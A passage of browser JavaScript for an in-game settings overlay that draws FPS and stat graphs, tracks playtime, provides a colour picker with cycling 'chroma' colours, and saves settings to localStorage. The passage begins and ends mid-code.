                  const cvs = root.querySelector(`#${gid}-canvas`);
                  const ctx = cvs?.getContext("2d") || null;
                  const prev = graphs.get(gid);
                  const raw = prev?.raw || [];
                  const smooth = prev?.smooth || [];
                  graphs.set(gid, {
                    id: gid,
                    ctx,
                    sample: opt.sample,
                    fmt: opt.fmt || ((v) => "" + v),
                    range: opt.range || { min: 0, max: 100 },
                    alpha: opt.alpha ?? 0.35,
                    raw,
                    smooth,
                    ema: prev?.ema ?? null,
                    avg: root.querySelector(`#${gid}-avg`),
                    min: root.querySelector(`#${gid}-min`),
                    max: root.querySelector(`#${gid}-max`),
                    now: root.querySelector(`#${gid}-now`),
                    rng: root.querySelector(`#${gid}-range`),
                  });
                  const g = graphs.get(gid);
                  if (g.rng) g.rng.textContent = "Last ~60s";
                  layout(root);
                  const firstStat = root.querySelector(".z-stat");
                  if (firstStat) firstStat.style.clear = "both";
                  if (active) start();
                };
                return {
                  register,
                  sampler,
                  raf,
                  safeNum: safe,
                  setActive,
                  layout,
                };
              })());
            const cfg = Array.isArray(onChange?.[0]) ? onChange[0] : [];
            const src = cfg?.[2];
            const isFps = `${id} ${title || ""}`.toLowerCase().includes("fps");
            const presetFps = {
              sample: () => {
                const f = G.safeNum(Number(window.fps));
                const val = f != null && f > 0 ? f : G.raf?.fps || 0;
                return Number.isFinite(val) ? Math.max(0, val) : null;
              },
              fmt: (v) => `${Math.round(v)} fps`,
              range: { min: 0, max: 120 },
              alpha: 0.4,
            };
            const custom = {
              sample: G.sampler(src),
              fmt: (v) => `${Math.round(v)}`,
              range: "dynamic",
              alpha: 0.3,
            };
            G.register(id, container, isFps ? presetFps : custom);
            if (!G._layoutBound) {
              G._layoutBound = 1;
              window.addEventListener("resize", () => G.layout(container));
            }
          },
          Stat: () => {
            const root = container;
            const card = root.querySelector(`#${id}.z-stat`);
            if (!card) return;
            const STAT_KEY = "abyss.stats.v3";
            const PLAY_KEY = "abyss.playtime.v1";
            const cfg0 = Array.isArray(onChange?.[0]) ? onChange[0] : [];
            const a0 = cfg0[0];
            const a1 = cfg0[1];
            const a2 = cfg0[2];
            const opt =
              a1 && typeof a1 === "object" && !Array.isArray(a1)
                ? a1
                : a2 && typeof a2 === "object" && !Array.isArray(a2)
                  ? a2
                  : {};
            const mode = String(opt.mode || "").toLowerCase();
            const elVal = root.querySelector(`#${id}-val`);
            const elTotal = root.querySelector(`#${id}-total`);
            const elWrap = root.querySelector(`#${id}-totalWrap`);
            const elBar = root.querySelector(`#${id}-bar`);
            const safeNum = (v) => (Number.isFinite(v) ? v : null);
            const readStore = () => {
              try {
                return JSON.parse(localStorage.getItem(STAT_KEY) || "{}");
              } catch {
                return {};
              }
            };
            const writeStore = (o) => {
              try {
                localStorage.setItem(STAT_KEY, JSON.stringify(o));
              } catch { }
            };
            const readPlay = () => {
              try {
                return JSON.parse(localStorage.getItem(PLAY_KEY) || "{}");
              } catch {
                return {};
              }
            };
            const writePlay = (o) => {
              try {
                localStorage.setItem(PLAY_KEY, JSON.stringify(o));
              } catch { }
            };
            const getFn =
              typeof opt.get === "function"
                ? opt.get
                : typeof a1 === "function"
                  ? a1
                  : typeof a0 === "function"
                    ? a0
                    : null;
            const labelKey = typeof a0 === "string" ? a0 : "";
            const totalKey = String(opt.totalKey || labelKey || id);
            const fmt =
              typeof opt.fmt === "function"
                ? opt.fmt
                : (v) => String((v ?? 0) | 0);
            const hideTotal = !!opt.hideTotal;
            const max =
              opt.max != null && Number.isFinite(+opt.max) && +opt.max > 0
                ? +opt.max
                : null;
            const barFn =
              typeof opt.bar === "function"
                ? opt.bar
                : max
                  ? (v) => Math.min(100, (Math.max(0, v) / max) * 100)
                  : null;
            if (hideTotal && elWrap) elWrap.style.display = "none";
            const initTotals = () => {
              const s = readStore();
              s.totals ||= {};
              s.prev ||= {};
              if (s.totals[totalKey] == null) s.totals[totalKey] = 0;
              if (s.prev[totalKey] == null) s.prev[totalKey] = 0;
              writeStore(s);
            };
            initTotals();
            AB.Menu.__ptStartMs ??= performance.now();
            const fmtTime = (ms) => {
              ms = Math.max(0, ms | 0);
              const sec = (ms / 1000) | 0;
              const h = (sec / 3600) | 0;
              const m = ((sec % 3600) / 60) | 0;
              const s = sec % 60;
              const p2 = (n) => String(n).padStart(2, "0");
              if (h > 0) return `${h}:${p2(m)}:${p2(s)}`;
              if (m > 0) return `${m}:${p2(s)}`;
              return `00:${p2(s)}`;
            };
            const ensurePlay = () => {
              const p = readPlay();
              if (p.totalMs == null) p.totalMs = 0;
              if (p.lastTs == null) p.lastTs = Date.now();
              writePlay(p);
              return p;
            };
            ensurePlay();
            const getPlaytime = () => {
              const sessionMs = Math.max(
                0,
                performance.now() - AB.Menu.__ptStartMs,
              );
              const p = ensurePlay();
              const now = Date.now();
              const last = Number.isFinite(+p.lastTs) ? +p.lastTs : now;
              if (document.visibilityState !== "visible") {
                p.lastTs = now;
                if (!p._saveAt || now >= p._saveAt) {
                  p._saveAt = now + 2000;
                  writePlay({ ...p });
                }
                return { sessionMs, totalMs: p.totalMs || 0 };
              }
              let dt = now - last;
              if (dt < 0) dt = 0;
              if (dt > 5000) dt = 0;
              p.lastTs = now;
              p.totalMs = (Number.isFinite(+p.totalMs) ? +p.totalMs : 0) + dt;
              if (!p._saveAt || now >= p._saveAt) {
                p._saveAt = now + 2000;
                writePlay({ ...p });
              }
              return { sessionMs, totalMs: p.totalMs };
            };
            const fixRows = () => {
              root.querySelectorAll(".z-stat-break").forEach((x) => x.remove());
              const stats = Array.from(root.querySelectorAll(".z-stat"));
              const COLS = 3;
              const GAP = 12;
              const setFull = (el) => {
                el.style.float = "none";
                el.style.width = "100%";
                el.style.marginRight = "0";
                el.style.clear = "both";
              };
              const setCols = (el, cols, pos) => {
                el.style.clear = "none";
                el.style.float = "left";
                el.style.width = ` calc((100% - ${(cols - 1) * GAP}px) / ${cols})`;
                el.style.marginRight = pos === cols - 1 ? "0" : GAP + "px";
              };
              const addBreak = (afterEl) => {
                afterEl.insertAdjacentElement(
                  "afterend",
                  Object.assign(document.createElement("div"), {
                    className: "z-stat-break",
                  }),
                );
              };
              stats.forEach((el) => {
                el.style.boxSizing = "border-box";
                el.style.marginBottom = "12px";
              });
              let i = 0;
              while (i < stats.length) {
                const left = stats.length - i;
                let colsThisRow = COLS;
                if (left < COLS) colsThisRow = left;
                if (colsThisRow === 1) {
                  setFull(stats[i]);
                  addBreak(stats[i]);
                  i += 1;
                  continue;
                }
                for (let pos = 0; pos < colsThisRow; pos++) {
                  setCols(stats[i + pos], colsThisRow, pos);
                }
                addBreak(stats[i + colsThisRow - 1]);
                i += colsThisRow;
              }
            };
            const renderOnce = () => {
              if (mode === "playtime" || a0 === "playtime") {
                card.classList.add("is-playtime");
                const pt = getPlaytime();
                if (elVal) elVal.textContent = fmtTime(pt.sessionMs);
                if (elWrap)
                  elWrap.innerHTML = `Total <b id="${id}-total">${fmtTime(pt.totalMs)}</b>`;
                if (elBar) {
                  const pct = Math.min(
                    100,
                    (pt.sessionMs / (60 * 60 * 1000)) * 100,
                  );
                  elBar.style.width = pct.toFixed(2) + "%";
                }
                fixRows();
                return;
              }
              const s = readStore();
              const curRaw = getFn ? safeNum(+getFn()) : null;
              const cur = curRaw == null ? 0 : Math.max(0, curRaw);
              const prev = safeNum(+s.prev[totalKey]) ?? 0;
              if (cur > prev)
                s.totals[totalKey] =
                  (safeNum(+s.totals[totalKey]) ?? 0) + (cur - prev);
              s.prev[totalKey] = cur;
              writeStore(s);
              if (elVal) elVal.textContent = fmt(cur);
              if (!hideTotal && elTotal)
                elTotal.textContent = String(
                  Math.round(s.totals[totalKey] || 0),
                );
              if (elBar) {
                let pct = 0;
                if (barFn) pct = safeNum(+barFn(cur)) ?? 0;
                pct = Math.min(100, Math.max(0, pct));
                elBar.style.width = pct + "%";
              }
              fixRows();
            };
            renderOnce();
            card._statTimer && clearInterval(card._statTimer);
            card._statTimer = setInterval(renderOnce, 100);
          },
          Colors: () => {
            const [
              idKey,
              defConf = "#ffffff",
              chromaConf = [false, false, 50],
            ] = Array.isArray(onChange?.[0])
                ? onChange[0]
                : [onChange?.[0], "#ffffff", [false, false, 50]];
            const [defVal, fixed] = Array.isArray(defConf)
              ? defConf
              : [defConf, false];
            const [allowChroma, startChroma, defaultSpeed] = chromaConf;
            const [n, l] = Array.isArray(onChange?.[1])
              ? onChange[1]
              : [onChange[1], onChange[1]];
            const notify = this.Notify(onChange, title);
            const p = el,
              preview = p?.querySelector(".z-color-preview"),
              popup = p?.querySelector(".z-color-popup"),
              wrap = p?.querySelector(".z-sv-wrap"),
              canvas = p?.querySelector(".z-sv"),
              ctx = canvas?.getContext("2d"),
              hue = p?.querySelector(".z-hue"),
              input = p?.querySelector(".z-input"),
              modeBtn = p?.querySelector(".z-mode-toggle");
            if (
              !p ||
              !preview ||
              !popup ||
              !wrap ||
              !canvas ||
              !ctx ||
              !hue ||
              !input ||
              !modeBtn
            )
              return;
            const clamp = (x, a, b) => Math.min(b, Math.max(a, x));
            if (idKey && allowChroma) {
              this[idKey + "Chroma"] ??= !!startChroma;
              this[idKey + "ChromaSpeed"] = clamp(
                +this[idKey + "ChromaSpeed"] || defaultSpeed,
                0,
                250,
              );
              this[idKey + "ChromaForce"] ??= true;
              const sv = this[idKey + "ChromaSV"];
              if (!Array.isArray(sv) || sv.length !== 2)
                this[idKey + "ChromaSV"] = [1, 1];
            }
            const hsvToRgb = (h, s, v) => {
              const c = v * s,
                x = c * (1 - Math.abs(((h / 60) % 2) - 1)),
                m = v - c;
              let r = 0,
                g = 0,
                b = 0;
              if (h < 60) [r, g, b] = [c, x, 0];
              else if (h < 120) [r, g, b] = [x, c, 0];
              else if (h < 180) [r, g, b] = [0, c, x];
              else if (h < 240) [r, g, b] = [0, x, c];
              else if (h < 300) [r, g, b] = [x, 0, c];
              else[r, g, b] = [c, 0, x];
              return { r: (r + m) * 255, g: (g + m) * 255, b: (b + m) * 255 };
            };
            const rgbToHex = ({ r, g, b }) =>
              "#" +
              [r, g, b]
                .map((v) => (v | 0).toString(16).padStart(2, "0"))
                .join("")
                .toUpperCase();
            const parseRgb = (s) => {
              s = (s || "").trim();
              if (/^#([0-9a-f]{6})$/i.test(s)) {
                return {
                  r: parseInt(s.slice(1, 3), 16),
                  g: parseInt(s.slice(3, 5), 16),
                  b: parseInt(s.slice(5, 7), 16),
                };
              }
              const m =
                s.match(
                  /^rgb\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*\)$/i,
                ) || s.match(/^(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})$/);
              if (m)
                return {
                  r: clamp(+m[1], 0, 255),
                  g: clamp(+m[2], 0, 255),
                  b: clamp(+m[3], 0, 255),
                };
              return { r: 255, g: 255, b: 255 };
            };
            const rgbToHsv = (r, g, b, prevH = 0) => {
              r /= 255;
              g /= 255;
              b /= 255;
              const max = Math.max(r, g, b),
                min = Math.min(r, g, b),
                d = max - min;
              const v = max,
                s = max === 0 ? 0 : d / max;
              if (d === 0) return { h: prevH, s, v };
              let h = 0;
              if (max === r) h = (60 * (((g - b) / d) % 6) + 360) % 360;
              else if (max === g) h = 60 * ((b - r) / d + 2);
              else h = 60 * ((r - g) / d + 4);
              return { h, s, v };
            };
            let cursor = wrap.querySelector(".z-sv-cursor");
            if (!cursor) {
              cursor = document.createElement("div");
              cursor.className = "z-sv-cursor";
              wrap.appendChild(cursor);
            }
            let mode = "HEX",
              H = 200,
              S = 1,
              V = 1,
              baseDirty = true,
              rect = null;
            const syncCanvas = () => {
              rect = canvas.getBoundingClientRect();
              if (rect.width < 2 || rect.height < 2) return null;
              const w = Math.max(1, rect.width | 0),
                h = Math.max(1, rect.height | 0);
              if (canvas.width !== w || canvas.height !== h) {
                canvas.width = w;
                canvas.height = h;
                baseDirty = true;
              }
              return rect;
            };
            const drawBase = () => {
              if (!syncCanvas()) return;
              const w = canvas.width,
                h = canvas.height;
              ctx.fillStyle = `hsl(${H},100%,50%)`;
              ctx.fillRect(0, 0, w, h);
              const gW = ctx.createLinearGradient(0, 0, w, 0);
              gW.addColorStop(0, "#fff");
              gW.addColorStop(1, "transparent");
              ctx.fillStyle = gW;
              ctx.fillRect(0, 0, w, h);
              const gB = ctx.createLinearGradient(0, 0, 0, h);
              gB.addColorStop(0, "transparent");
              gB.addColorStop(1, "#000");
              ctx.fillStyle = gB;
              ctx.fillRect(0, 0, w, h);
              baseDirty = false;
            };
            const drawCursor = () => {
              if (!rect) rect = canvas.getBoundingClientRect();
              cursor.style.left = S * rect.width + "px";
              cursor.style.top = (1 - V) * rect.height + "px";
            };
            const ensureDrawn = () => {
              if (baseDirty) drawBase();
              drawCursor();
            };
            const chromaOn = () => allowChroma && !!this[idKey + "Chroma"];
            const setVal = (hex, doNotify = false) => {
              if (!fixed && idKey) this[idKey] = hex;
              preview.style.background = hex;
              input.value =
                mode === "HEX"
                  ? hex
                  : (() => {
                    const { r, g, b } = parseRgb(hex);
                    return `${r},${g},${b}`;
                  })();
              hue.value = String(Math.round(H));
              doNotify && notify(hex);
            };
            const applyHex = (hex, doNotify = false) => {
              const { r, g, b } = parseRgb(hex),
                hsv = rgbToHsv(r, g, b, H);
              H = hsv.h === 0 && H === 360 ? 360 : hsv.h;
              S = hsv.s;
              V = hsv.v;
              baseDirty = true;
              ensureDrawn();
              setVal(rgbToHex({ r, g, b }), doNotify);
              doNotify && save();
            };
            applyHex(this[idKey] ?? defVal, false);
            if (fixed) {
              if (idKey) this[idKey] = rgbToHex(parseRgb(defVal));
              preview.style.background =
                this[idKey] || rgbToHex(parseRgb(defVal));
              input.value = preview.style.background;
              p.classList.remove("open");
              p.style.pointerEvents = "none";
              preview.style.cursor = "not-allowed";
              return;
            }
            const eqHex = (a, b) =>
              String(a || "").toUpperCase() === String(b || "").toUpperCase();
            const trueDefault =
              (Array.isArray(defConf) ? defConf[0] : defConf) ?? "#ffffff";
            let dragging = false,
              raf = 0,
              last = null;
            const fromXY = (x01, y01) => {
              if (baseDirty) drawBase();
              S = clamp(x01, 0, 1);
              V = clamp(1 - y01, 0, 1);
              if (allowChroma && chromaOn() && !this[idKey + "ChromaForce"]) {
                this[idKey + "ChromaSV"] = [S, V];
              }
              drawCursor();
              setVal(rgbToHex(hsvToRgb(H, S, V)), false);
            };
            const queue = (cx, cy) => {
              if (!last) return;
              const x = (cx - last.left) / last.width,
                y = (cy - last.top) / last.height;
              if (raf) return;
              raf = requestAnimationFrame(() => {
                raf = 0;
                fromXY(x, y);
              });
            };
            canvas.addEventListener("pointerdown", (e) => {
              dragging = true;
              canvas.setPointerCapture(e.pointerId);
              last = canvas.getBoundingClientRect();
              if (last.width < 2 || last.height < 2) return;
              queue(e.clientX, e.clientY);
            });
            canvas.addEventListener(
              "pointermove",
              (e) => dragging && queue(e.clientX, e.clientY),
            );
            canvas.addEventListener("pointerup", () => {
              dragging = false;
              applyHex(rgbToHex(hsvToRgb(H, S, V)), !chromaOn());
            });
            canvas.addEventListener("pointercancel", () => (dragging = false));
            hue.addEventListener("input", () => {
              H = clamp(+hue.value || 0, 0, 360);
              baseDirty = true;
              ensureDrawn();
              setVal(rgbToHex(hsvToRgb(H === 360 ? 0 : H, S, V)), false);
            });
            hue.addEventListener("change", () =>
              applyHex(rgbToHex(hsvToRgb(H, S, V)), !chromaOn()),
            );
            modeBtn.addEventListener("click", (e) => {
              e.stopPropagation();
              mode = mode === "HEX" ? "RGB" : "HEX";
              modeBtn.textContent = mode;
              setVal(this[idKey] ?? defVal, false);
            });
            input.addEventListener("change", (e) => {
              e.stopPropagation();
              applyHex(rgbToHex(parseRgb(input.value)), true);
            });
            const openPopup = () => {
              p.classList.add("open");
              requestAnimationFrame(() => {
                rect = null;
                baseDirty = true;
                if (allowChroma && chromaOn()) {
                  if (this[idKey + "ChromaForce"]) {
                    S = 1;
                    V = 1;
                    this[idKey + "ChromaSV"] = [1, 1];
                  } else {
                    const sv = this[idKey + "ChromaSV"] || [1, 1];
                    S = clamp(+sv[0] || 0, 0, 1);
                    V = clamp(+sv[1] || 0, 0, 1);
                  }
                  ensureDrawn();
                  setVal(rgbToHex(hsvToRgb(H, S, V)), false);
                  return;
                }
                ensureDrawn();
                setVal(this[idKey] ?? defVal, false);
              });
            };
            const closePopup = () => p.classList.remove("open");
            preview.addEventListener("click", (e) => {
              e.stopPropagation();
              p.classList.toggle("open");
              p.classList.contains("open") ? openPopup() : closePopup();
            });
            popup.addEventListener("click", (e) => e.stopPropagation());
            document.addEventListener(
              "click",
              () => p.classList.contains("open") && closePopup(),
            );
            preview.addEventListener("mousedown", (e) => {
              if (e.button === 1) e.preventDefault();
            });
            preview.addEventListener("auxclick", (e) => {
              if (e.button !== 1) return;
              e.preventDefault();
              e.stopPropagation();
              if (chromaOn()) return;
              const cur = (this[idKey] ?? defVal).toUpperCase();
              let hex;
              do
                hex =
                  "#" +
                  ((Math.random() * 0xffffff) | 0)
                    .toString(16)
                    .padStart(6, "0")
                    .toUpperCase();
              while (hex === cur);
              applyHex(hex, true);
            });
            const stopChromaTimers = () => {
              if (p._chromaInterval) {
                clearInterval(p._chromaInterval);
                p._chromaInterval = 0;
              }
              if (p._chromaRaf) {
                cancelAnimationFrame(p._chromaRaf);
                p._chromaRaf = 0;
              }
            };
            const chromaTick = () => {
              if (!chromaOn()) return;
              H = (H + 1) % 360;
              if (this[idKey + "ChromaForce"]) {
                S = 1;
                V = 1;
                this[idKey + "ChromaSV"] = [1, 1];
              } else {
                const sv = this[idKey + "ChromaSV"] || [1, 1];
                S = clamp(+sv[0] || 0, 0, 1);
                V = clamp(+sv[1] || 0, 0, 1);
              }
              baseDirty = true;
              ensureDrawn();
              setVal(rgbToHex(hsvToRgb(H, S, V)), false);
            };
            const stopChroma = () => {
              stopChromaTimers();
              const storedColor = this[idKey] ?? defVal;
              preview.style.background = storedColor;
              input.value = storedColor;
            };
            const restartChroma = () => {
              stopChromaTimers();
              if (!allowChroma) return;
              if (!chromaOn()) {
                stopChroma();
                return;
              }
              const sp = +this[idKey + "ChromaSpeed"];
              const speed = Number.isFinite(sp) ? sp : defaultSpeed;
              if (speed <= 0) {
                const loop = () => {
                  if (!chromaOn()) {
                    p._chromaRaf = 0;
                    return;
                  }
                  chromaTick();
                  p._chromaRaf = requestAnimationFrame(loop);
                };
                p._chromaRaf = requestAnimationFrame(loop);
                return;
              }
              p._chromaInterval = setInterval(() => {
                if (!chromaOn()) return;
                chromaTick();
              }, speed);
            };
            preview.addEventListener("contextmenu", (e) => {
              e.preventDefault();
              e.stopPropagation();
              if (e.shiftKey && allowChroma) {
                const next = !this[idKey + "Chroma"];
                this[idKey + "Chroma"] = next;
                if (next) {
                  const [cs, cv] = this[idKey + "ChromaSV"] || [S, V];
                  S = cs;
                  V = cv;
                  baseDirty = true;
                  ensureDrawn();
                }
                restartChroma();
                save();
                notify(next, `${title} Chroma`);
                return;
              }
              if (allowChroma && this[idKey + "Chroma"]) return;
              const cur = this[idKey] ?? defVal;
              if (!eqHex(cur, trueDefault)) applyHex(trueDefault, true);
            });
            const notifySpeed = this.Notify(onChange, title, (v) => `${v}ms`);
            p.addEventListener(
              "wheel",
              (e) => {
                if (!allowChroma || !e.shiftKey) return;
                e.preventDefault();
                const cur = +this[idKey + "ChromaSpeed"];
                const curSpeed = Number.isFinite(cur) ? cur : defaultSpeed;
                const next = clamp(curSpeed + Math.sign(e.deltaY) * 10, 0, 250);
                if (next === curSpeed) return;
                this[idKey + "ChromaSpeed"] = next;
                restartChroma();
                save();
                notifySpeed(next);
              },
              { passive: false },
            );
            window.addEventListener("resize", () => {
              if (!p.classList.contains("open")) return;
              rect = null;
              baseDirty = true;
              ensureDrawn();
            });
            if (!window._chromaRestarters) window._chromaRestarters = {};
            if (!window._chromaStoppers) window._chromaStoppers = {};
            if (allowChroma) {
              window._chromaRestarters[idKey] = restartChroma;
              window._chromaStoppers[idKey] = stopChroma;
            }
          },
        };
        if (handlers[type]) handlers[type]();
      });
    },
    _silent: false,
    withSilent(fn) {
      this._silent = true;
      try {
        fn();
      } finally {
        this._silent = false;
      }
    },

    buildSaveKeys() {
      const flatten = (opts, out = []) => {
        (opts || []).forEach((o) => {
          out.push(o);
          if (o?.suboptions) flatten(o.suboptions, out);
        });
        return out;
      },
        all = flatten(
          [].concat(
            this.Main || [],
            this.Setting || [],
            this.Render || [],
            this.Gui || [],
            this.Bot || [],
          ),
        ),
        keys = new Set(),
        defaults = {};
      all.forEach((o) => {
        if (!o?.onChange) return;
        const cfg = Array.isArray(o.onChange?.[0])
          ? o.onChange[0]
          : [o.onChange?.[0]];
        const idKey = cfg?.[0];
        if (!idKey) return;
        let def = cfg?.[1];
        if (o.type === "checkbox") def = def ?? false;
        if (o.type === "slider") def = def ?? 0;
        if (o.type === "Input") def = def ?? "";
        if (o.type === "selector") {
          const list = cfg?.[2];
          if (def === undefined) def = Array.isArray(list) ? list[0] : list;
        }
        if (o.type === "SelecBox") {
          const cfg0 = Array.isArray(o.onChange?.[0]) ? o.onChange[0] : [];
          const defSel = typeof cfg0[0] === "string" ? cfg0[0] : "";
          const pairs = cfg0.filter((x) => Array.isArray(x));
          const selKey = `__SB_${o.id}`;
          defaults[selKey] = defSel;
          keys.add(selKey);
          pairs.forEach(([k, d]) => {
            defaults[k] = !!d;
            keys.add(k);
          });
          return;
        }
        if (o.type === "Colors") {
          if (Array.isArray(def)) def = def[0];
          def = def ?? "#ffffff";
          const chroma = cfg?.[2],
            allow = Array.isArray(chroma) ? chroma[0] : false;
          if (allow) {
            defaults[idKey + "Chroma"] = chroma[1] ?? false;
            defaults[idKey + "ChromaSpeed"] = chroma[2] ?? 50;
            defaults[idKey + "ChromaForce"] = true;
            defaults[idKey + "ChromaSV"] = [1, 1];
            keys.add(idKey + "Chroma");
            keys.add(idKey + "ChromaSpeed");
            keys.add(idKey + "ChromaForce");
            keys.add(idKey + "ChromaSV");
          }
        }
        defaults[idKey] = def;
        keys.add(idKey);
      });
      // Add party mode state to save keys
      keys.add("_partyModeActive");
      keys.add("_partyModeOriginalChroma");
      keys.add("_partyModeOriginalColors");
      defaults["_partyModeActive"] = false;
      defaults["_partyModeOriginalChroma"] = null;
      defaults["_partyModeOriginalColors"] = null;
      this._saveKeys = [...keys];
      this._defaults = defaults;
      this._flatOpts = all;
    },

    loadSettings() {
      try {
        const raw = localStorage.getItem(this.storeKey);
        if (raw) {
          const data = JSON.parse(raw);
          this._saveKeys?.forEach((k) => {
            if (k in data) this[k] = data[k];
          });
        }
      } catch { }
      const autoRaw = localStorage.getItem(this.autoKey);
      this.autoSave = autoRaw == null ? true : autoRaw === "1";
    },

    saveSettings() {
      const data = {};
      this._saveKeys?.forEach((k) => {
        if (this[k] !== undefined) data[k] = this[k];
      });
      try {
        localStorage.setItem(this.storeKey, JSON.stringify(data));
      } catch { }
    },

    resetDefaults() {
      const clone = (v) =>
        Array.isArray(v)
          ? v.slice()
          : v && typeof v === "object"
            ? JSON.parse(JSON.stringify(v))
            : v;
      this.withSilent(() => {
        Object.entries(this._defaults || {}).forEach(([k, v]) => {
          this[k] = clone(v);
        });
        this.syncUI(true);
        this.saveSettings(true);
      });
      AB.NotiDisplay.add("Defaults restored ✓", "#9B5CFF", 0);
    },

    syncUI(silent = false) {
      const root = this.menu;
      if (!root || !this._flatOpts) return;
      const run = () => {
        this._flatOpts.forEach((o) => {
          if (!o?.onChange || !o.id) return;
          const cfg = Array.isArray(o.onChange?.[0])
            ? o.onChange[0]
            : [o.onChange?.[0]];
          const idKey = cfg?.[0];
          if (!idKey) return;
          const val = this[idKey];
          if (o.type === "Input") {
            const el = root.querySelector(`#${o.id}`);
            if (el) el.value = val ?? "";
            return;
          }
          if (o.type === "slider") {
            const el = root.querySelector(`#${o.id}`);
            const vEl = root.querySelector(`#${o.id}Value`);
            if (el) el.value = val ?? 0;
            if (vEl) vEl.textContent = "" + (val ?? 0);
            return;
          }
          if (o.type === "selector") {
            const wrap = root.querySelector(`#${o.id}`);
            if (!wrap) return;
            const valueEl = wrap.querySelector(`#${o.id}Value`);
            const opts = [...wrap.querySelectorAll(".z-select-option")];
            const v = val ?? (valueEl ? valueEl.textContent : "");
            if (valueEl) valueEl.textContent = v;
            opts.forEach((x) =>
              x.classList.toggle("selected", x.dataset.value === v),
            );
            return;
          }
          if (o.type === "SelecBox") {
            const wrap = root.querySelector(`#${o.id}-sel`),
              chk = root.querySelector(`#${o.id}-chk`),
              val = root.querySelector(`#${o.id}-selValue`),
              opt = root.querySelector(`#${o.id}-selOptions`);
            if (!wrap || !chk || !val || !opt) return;
            const selKey = `__SB_${o.id}`,
              selected = String(this[selKey] ?? "");
            val.textContent = selected;
            const isOn = !!this[selected];
            chk.classList.toggle("active", isOn);
            chk.dataset.value = isOn;
            [...opt.querySelectorAll(".z-select-option")].forEach((x) => {
              const name = x.dataset.value;
              const on = !!this[name];
              x.classList.toggle("is-on", on);
              x.classList.toggle("current", name === selected);
            });
            return;
          }
          if (o.type === "Colors") {
            const wrap = root.querySelector(`#${o.id}`);
            if (!wrap) return;
            const prev = wrap.querySelector(".z-color-preview");
            const input = wrap.querySelector(".z-input");
            const def = this._defaults?.[idKey] ?? "#ffffff";
            const v = val ?? def;
            if (prev) prev.style.background = v;
            if (input) input.value = v;
            return;
          }
          if (o.type === "Loadout") {
            const disp = root.querySelector(`#${o.id}.z-loadout-display`);
            if (disp?._setLoadout) disp._setLoadout(val);
            return;
          }
          if (o.type === "checkbox") {
            if (idKey in this) this[idKey] = !!val;
          }
        });
      };
      if (silent) this.withSilent(run);
      else run();
    },

    queueSave() {
      if (!this.autoSave) return;
      this.saveSettings();
    },

    setupSaveControls() {
      this.saveBtn = this.menu.querySelector("#z-save");
      this.resetBtn = this.menu.querySelector("#z-reset");
      if (!this.saveBtn || !this.resetBtn) return;
      const setAuto = (v) => {
        this.autoSave = !!v;
        localStorage.setItem(this.autoKey, this.autoSave ? "1" : "0");
        this.saveBtn.classList.toggle("active", this.autoSave);
        AB.NotiDisplay.add(
          `AutoSave: ${this.autoSave ? "ON" : "OFF"}`,
          this.autoSave ? "#9B5CFF" : "#ff4d4d",
          0,
        );
      };
      this.saveBtn.classList.toggle("active", this.autoSave);
      this.saveBtn.onclick = (e) => {
        if (this.autoSave) return;
        e.preventDefault();
        this.saveSettings(true);
        AB.NotiDisplay.add("Saved ✓", "#9B5CFF", 0);
      };
      this.saveBtn.oncontextmenu = (e) => {
        e.preventDefault();
        setAuto(!this.autoSave);
      };
      this.resetBtn.onclick = () => this.resetDefaults();

      const renderResetBtn = this.menu.querySelector("#resetRenderDefaults");
      if (renderResetBtn) {
        renderResetBtn.onclick = () => this.resetRenderDefaults();
        renderResetBtn.onmouseenter = () =>
          (renderResetBtn.style.background = "rgba(255,77,77,0.12)");
        renderResetBtn.onmouseleave = () =>
          (renderResetBtn.style.background = "");
      }

      const partyModeBtn = this.menu.querySelector("#partyModeToggle");
      if (partyModeBtn) {
        // Restore party mode state from saved settings (default to false if not saved)
        this._partyModeActive = !!this._partyModeActive;
        // Restore original chroma/color states if they exist
        if (!this._partyModeOriginalChroma) {
          this._partyModeOriginalChroma = null;
        }
        if (!this._partyModeOriginalColors) {
          this._partyModeOriginalColors = null;
        }
        const updatePartyStyle = () => {
          if (this._partyModeActive) {
            partyModeBtn.style.background =
              "linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3)";
            partyModeBtn.style.backgroundSize = "200% 100%";
            partyModeBtn.style.animation = "partyGradient 2s linear infinite";
            partyModeBtn.querySelector(".z-option-title").textContent =
              "Party Mode (ON)";
          } else {
            partyModeBtn.style.background = "";
            partyModeBtn.style.animation = "";
            partyModeBtn.querySelector(".z-option-title").textContent =
              "Party Mode";
          }
        };
        partyModeBtn.onclick = () => this.togglePartyMode();
        partyModeBtn.onmouseenter = () => {
          if (!this._partyModeActive) {
            partyModeBtn.style.background = "rgba(155,92,255,0.15)";
          }
        };
        partyModeBtn.onmouseleave = () => updatePartyStyle();
        updatePartyStyle();

        // If party mode was active on load, start all chromas
        // If party mode was NOT active, ensure chromas match saved individual states
        const colorKeys = this.getColorOptionKeys();
        if (this._partyModeActive) {
          // Party mode is on - start all chromas
          setTimeout(() => {
            colorKeys.forEach((key) => {
              if (window._chromaRestarters && window._chromaRestarters[key]) {
                window._chromaRestarters[key]();
              }
            });
          }, 100);
        } else {
          // Party mode is off - if we have saved original colors, restore them
          // This handles the case where user refreshed while party mode was "on" but flag got corrupted
          if (this._partyModeOriginalColors) {
            colorKeys.forEach((key) => {
              if (this._partyModeOriginalColors[key] !== undefined) {
                this[key] = this._partyModeOriginalColors[key];
              }
              // Disable all chroma
              this[key + "Chroma"] = false;
            });
            this._partyModeOriginalChroma = null;
            this._partyModeOriginalColors = null;
            this.saveSettings(true);
          }
          // Make sure all chromas are stopped and colors are applied
          setTimeout(() => {
            colorKeys.forEach((key) => {
              // Stop all chromas
              if (window._chromaStoppers && window._chromaStoppers[key]) {
                window._chromaStoppers[key]();
              }
            });
          }, 100);
        }
      }
    },

    togglePartyMode() {
      const colorKeys = this.getColorOptionKeys();

      if (!this._partyModeActive) {
        // Turning ON party mode
        this._partyModeOriginalChroma = {};
        this._partyModeOriginalColors = {};
        colorKeys.forEach((key) => {
          const chromaKey = key + "Chroma";
          // Save original chroma state and color value before enabling
          this._partyModeOriginalChroma[chromaKey] = !!this[chromaKey];
          this._partyModeOriginalColors[key] = this[key];
          this[chromaKey] = true;
        });
        this._partyModeActive = true;
        AB.NotiDisplay.add("Party Mode ON 🎉", "#9B5CFF", 0);

        // Start all chromas
        colorKeys.forEach((key) => {
